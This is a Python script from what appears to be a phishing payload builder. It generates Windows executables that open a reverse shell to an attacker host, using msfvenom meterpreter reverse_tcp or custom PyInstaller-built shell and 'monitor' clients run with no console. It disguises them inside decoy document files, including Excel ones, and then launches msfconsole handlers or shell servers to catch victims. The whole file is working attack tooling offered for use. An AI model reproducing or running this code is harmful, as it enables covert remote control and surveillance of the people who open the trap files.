from os import system, popen
from Scripts.Trap import *  #import our module


def pre_built_in_payload():
    full_file_name, file_name, extension = input_file()
    #payload choosing

    pay_choise = Liste_of_payloads()
    #enter Ip, port, and the output file name
    Ip, port = Ip_port_input()

    #check if excel was selected

    r = "net"+str(randint(1,99)) + ".exe"
    print_red("[!] Creating your file, please Wait...")

    #preparing the payload
    if(pay_choise == 1):
     	payload = "windows/meterpreter/reverse_tcp"
     	system(("msfvenom -p {payload} -e ruby/base64 LHOST={Ip}  LPORT={port} -f exe -o {r}").format(payload = payload,Ip = Ip,port = port, r=r))
    elif(pay_choise == 2):
        exe_prepare("./Scripts/shell_server.py", Ip, port)
        exe_prepare("./Scripts/shell_client.py", Ip, port)
        system("wine python.exe -m PyInstaller Scripts/shell_client.py --onefile --noconsole")
        system(("mv dist/shell_client.exe {r}").format(r=r))
        system("rm shell_client.spec")
    elif(pay_choise == 3):
        exe_prepare("./Scripts/monitor_server.py", Ip, port)
        exe_prepare("./Scripts/monitor_client.py", Ip, port)
        system(("wine python.exe -m PyInstaller Scripts/monitor_client.py --onefile --noconsole"))
        system(("mv dist/monitor_client.exe {r}").format(r=r))

        #should not be removed because it conatains additional paths to needed libraries
        system("rm monitor_client.spec")

    #check if excel was selected
    if (extension == "xls"):
        #jump to the excel function and exit after its execution
        special_excel(r, Ip)

    else:
        #preparing fileinti.txt and generate the Trap file
        init_prepare(full_file_name, r)
        generate(file_name, extension, r)
        print_red("[!] Your file is at output directory")

    if (pay_choise == 1):
        system(('msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set Lhost {Ip}; set LPORT {port}; set StageEncoder ruby/base64; run"').format(Ip=Ip, port=port))
    elif (pay_choise == 2):
    	system("python3 Scripts/shell_server.py")
    elif (pay_choise == 3) :
    	system("python3 Scripts/monitor_server.py")


def customize_your_payload():
    full_file_name, file_name, extension = input_file()
    full_pay_name, pay_name = input_payload()

    #check if excel was selected
    if (extension == "xls"):
        #jump to the excel function and exit after its execution
        special_excel(full_pay_name, "no")
    else:
        print_red("[!] Creating your file, please Wait ...")
        init_prepare(full_file_name, full_pay_name)
        generate(file_name, extension, full_pay_name)
        print_red("[!] Your file is at output directory")


banner()
while True:
    phishing_ch = phishing_choise()
    if phishing_ch == 1:
        pre_built_in_payload()
        break
    elif phishing_ch == 2:
        customize_your_payload()
        break
